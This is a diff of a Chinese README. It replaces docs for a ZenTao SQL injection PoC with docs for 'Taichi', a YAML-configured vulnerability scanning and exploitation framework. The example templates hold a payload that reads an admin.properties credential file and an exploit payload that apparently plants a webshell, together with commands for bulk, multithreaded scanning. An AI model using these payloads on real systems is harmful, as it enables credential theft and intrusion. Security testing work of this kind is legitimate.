@@ -1,29 +1,116 @@
-# 简介
-CNVD-2022-42853禅道16.5 SQL注入Poc
+# Taichi
 
-# 声明
-此工具仅限授权安全测试使用,禁止非法攻击未授权站点
+持续更新中
 
-# 漏洞信息
-漏洞编号：CNVD-2022-42853
-漏洞等级: 高危
-公开日期：2022-06-14
-影响产品:
-青岛易软天创网络科技有限公司 禅道企业版 6.5
-青岛易软天创网络科技有限公司 禅道旗舰版 3.0
-青岛易软天创网络科技有限公司 禅道开源版 16.5
-青岛易软天创网络科技有限公司 禅道开源版 16.5.beta1
+## 历史更新
 
-# 使用教程
+2023.3.24
 
-参数
+新增识别exp，poc功能
+
+新增扫描多个poc功能
+
+适配[CVE-2023-28432](https://mp.weixin.qq.com/s/vpI3C575BxSPzHNi_oF60w)
+
+## 前言
+
+之前写了几个poc，感觉代码有很多相似的地方，所以我寻思能不能写个大体框架，这样以后就不用改来改去了。当然，我也知道有nuclei这样成熟好用的工具，但是我还是想试试，所以就搞了一个这个。（大佬勿喷）
+
+目前才搞了几天，测试的数量也不多，算是个雏形，所以会有很多bug，请见谅。如有bug或者建议欢迎联系我
+
+## 介绍
+
+可以自定义poc或者exp的扫描框架
+
+## poc.yaml格式
 
 ```
-python3 CNVD-2022-42853.py -h
+#种类：poc对应的是scan.py
+- type:
+  - type: "poc"
 
-usage: CNVD-2022-42853.py [-h] [-rh remote_host] [-f file_path] [-o outfile_path]
+#请求方式
+- method:
+  - method: "post"
 
-CNVD-2022-42853 Poc by atk7r
+#payload
+- payload:
+  - var: '{"body":{"file":"/WEB-INF/KmssConfig/admin.properties"}}'
+  
+#response包里的关键字
+- word:
+  - word:
+      - "password"
+
+#漏洞的位置
+- url:
+  - url : "/sys/ui/extend/varkind/custom.jsp"
+```
+
+例子中的payload
+
+```
+  - var: '{"body":{"file":"/WEB-INF/KmssConfig/admin.properties"}}'
+```
+
+可以随意变换为request包里的内容，例如:
+
+```
+  - a: 'aaaaaaaaaaa'
+```
+
+如果像[(CVE-2023-28432)](https://mp.weixin.qq.com/s/vpI3C575BxSPzHNi_oF60w)这样的漏洞，没有payload，写成：
+
+```
+  - isNone : 'isNone'
+```
+
+## exp.yaml格式
+
+```
+#种类：exp对应的是attack.py
+- type:
+  - type: "exp"
+
+#请求方式
+- method:
+  - method: "post"
+
+#payload
+- payload:
+  - s_bean: 'ruleFormulaValidate&script=u0067\u0020\u003d\u0020\u0074'
+
+#response包里的关键字
+- word:
+  - word:
+      - "ok"
+
+#漏洞的位置
+- url:
+  - url : "/sys/ui/extend/varkind/custom.jsp"
+
+#attack中 验证 是否攻击成功的 请求方式
+- method-V:
+  - method: "get"
+
+#webshell位置
+- verify:
+  - verify : "/login_listyes.jsp"
+
+```
+
+同理，payload内容也是可以变的
+
+### 注意：yaml文件中参数的位置不可以改变
+
+## 使用方法
+
+```
+python3 Taichi.py -h
+usage: Taichi.py [-h] [-rh remote_host] [-f file_path] [-o outfile_path]
+                 [-t thread_num] [-p poc_path] [-a all poc or exp]
+
+Taichi by atk7r
 
 options:
   -h, --help            show this help message and exit
@@ -32,25 +119,33 @@ options:
   -f file_path, --file file_path
                         Please input file path to scan.
   -o outfile_path, --outfile outfile_path
-                        Please input path and filename for output file.
-
+                        Please input path for output file.
+  -t thread_num, --thread thread_num
+                        Please input thread number.
+  -p poc_path, --poc poc_path
+                        Please input poc path to scan.
+  -a all poc or exp, --all all poc or exp
+                        Please input poc path to scan.
 ```
 
-单个扫描（一定要是ip或者域名，后面可以加端口）
+### 扫描单个目标
 
 ```
-python3 CNVD-2022-42853.py -rh 192.168.0.1
-python3 CNVD-2022-42853.py -rh 192.168.0.1:8088
-
-python3 CNVD-2022-42853.py -rh www.abc.com
-python3 CNVD-2022-42853.py -rh www.abc.com:8088
+python3 Taichi.py -rh 123.123.123.123 -p poc.yaml
+python3 Taichi.py -rh 123.123.123.123 -a /root/Taichi/pocs
 ```
 
-批量扫描（url.txt的内容一定要是ip或者域名，后面可以加端口）
+### 扫描多个目标
 
 ```
-python3 CNVD-2022-42853.py -f url.txt -o outfile.txt
+python3 Taichi.py -f target.txt -p poc.yaml -o result.txt
+python3 Taichi.py -f target.txt -a /root/Taichi/pocs -o result.txt
 ```
 
-# 详情
-https://www.yuque.com/docs/share/b85f0859-2f78-44de-ad1c-2305a0fbca9e?# 《禅道16.5 SQL注入复现》
+### 多线程扫描
+
+```
+python3 Taichi.py -f target.txt -p poc.yaml -o result.txt -t 5
+python3 Taichi.py -f target.txt -a /root/Taichi/pocs -o result.txt -t 5
+```
+
